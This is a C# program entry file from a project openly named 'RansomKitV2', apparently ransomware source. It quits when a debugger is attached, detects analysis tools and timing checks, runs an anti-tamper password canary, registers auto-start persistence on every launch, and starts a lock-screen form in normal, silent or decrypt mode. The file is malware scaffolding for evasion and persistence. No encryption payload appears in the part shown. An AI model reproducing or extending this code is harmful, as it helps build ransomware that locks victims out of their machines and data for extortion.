using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace RansomKitV2
{
    public enum LaunchMode { Normal, Silent, Decrypt }

    internal static class Program
    {
        [STAThread]
        static void Main(string[] args)
        {
#if !DEBUG
            if (IsDebuggerPresent()) Environment.Exit(0);
            if (AntiCrackEngine.IsMaliciousProcessPresent()) Environment.Exit(0);
            if (AntiCrackEngine.IsTimingSuspicious()) Environment.Exit(0);

            // anti-tamper canary on VerifyPassword
            if (!CryptoEngine.VerifyPassword(CryptoEngine.MasterKeyString)) Environment.Exit(0);
            if (CryptoEngine.VerifyPassword("__wrong_canary_probe__")) Environment.Exit(0);
#endif

            // Register auto-start on every launch — idempotent.
            Persistence.EnsureAutoStart();

            LaunchMode mode = LaunchMode.Normal;
            foreach (var a in args)
            {
                if (string.Equals(a, "--silent", StringComparison.OrdinalIgnoreCase)) mode = LaunchMode.Silent;
                else if (string.Equals(a, "--decrypt", StringComparison.OrdinalIgnoreCase)) mode = LaunchMode.Decrypt;
            }

            // Silent on an already-unlocked machine = no-op.
            if (mode == LaunchMode.Silent && !Persistence.IsLocked())
                Environment.Exit(0);

            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            Application.SetHighDpiMode(HighDpiMode.SystemAware);
            Application.Run(new MainForm(mode));
        }

        [DllImport("kernel32.dll")]
        private static extern bool IsDebuggerPresent();
    }
}